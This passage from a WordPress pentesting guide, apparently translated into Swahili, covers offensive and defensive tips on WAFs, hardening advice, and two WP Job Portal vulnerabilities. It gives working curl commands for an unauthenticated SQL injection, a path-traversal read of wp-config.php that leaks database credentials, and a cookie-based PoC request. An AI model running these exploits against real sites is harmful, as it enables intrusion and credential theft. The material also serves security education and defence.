GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Mambo ya WAF kwa WordPress/plugin CVEs

WAFs za edge/server zimetengenezwa kwa ajili ya mifumo mpana (SQLi, XSS, LFI). Makosa mengi yenye athari kubwa kwenye WordPress/plugin ni hitilafu za mantiki/uthibitisho ndani ya application ambazo zinaonekana kama trafiki isiyo hatari isipokuwa engine itakayofahamu WordPress routes na plugin semantics.

Vidokezo vya Ofensi

- Lenga endpoints maalum za plugin na payloads safi: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Chunguza njia zisizo za uthibitisho kwanza (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads mara nyingi zinafanikiwa bila obfuscation.
- Mifano ya kawaida yenye athari kubwa: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Vidokezo vya Ulinzi

- Usitegemee saini za WAF za jumla kulinda plugin CVEs. Tekeleza virtual patches za application-layer zinazolenga udhaifu maalum au sasisha haraka.
- Pendelea positive-security checks ndani ya code (capabilities, nonces, strict input validation) badala ya negative regex filters.

## Ulinzi wa WordPress

### Sasisho za Mara kwa Mara

Hakikisha WordPress, plugins, na themes ziko kwenye toleo la sasa. Pia thibitisha kwamba automated updating imewezeshwa katika wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Pia, **weka tu WordPress plugins na themes zinazoweza kuaminika**.

### Plugins za Usalama

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Mapendekezo Mengine**

- Ondoa mtumiaji chaguo-msingi **admin**
- Tumia **nywila zenye nguvu** na **2FA**
- Kila mara **kagua** **ruhusa** za watumiaji
- **Punguza idadi ya jaribio za kuingia** ili kuzuia Brute Force attacks
- Badilisha jina la faili **`wp-admin.php`** na ruhusu ufikiaji tu ndani au kutoka anwani za IP maalum.


### Unauthenticated SQL Injection kutokana na ukosefu wa uthibitishaji (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Ingizo la mtumiaji lisilosafishwa** – `parentid` linaingia moja kwa moja kutoka HTTP request.
2. **String concatenation inside the WHERE clause** – hakuna `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – ingawa action inatekelezwa kupitia `admin-post.php`, ukaguzi wa pekee uliopo ni **CSRF nonce** (`wp_verify_nonce()`), ambao mtumiaji yeyote anaweza kuupata kutoka ukurasa wa umma unaoingiza shortcode `[wpjobportal_my_resumes]`.

#### Utekelezaji

1. Pata nonce mpya:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### Kupakua Faili Bila Uthibitisho / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` inadhibitiwa na mshambuliaji na imeunganishwa **bila kusafishwa**. Mara nyingine tena, kizuizi pekee ni **CSRF nonce** ambayo inaweza kupatikana kutoka kwenye ukurasa wa resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Seva inarudisha yaliyomo ya `wp-config.php`, leaking DB credentials and auth keys.

## Marejeo

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
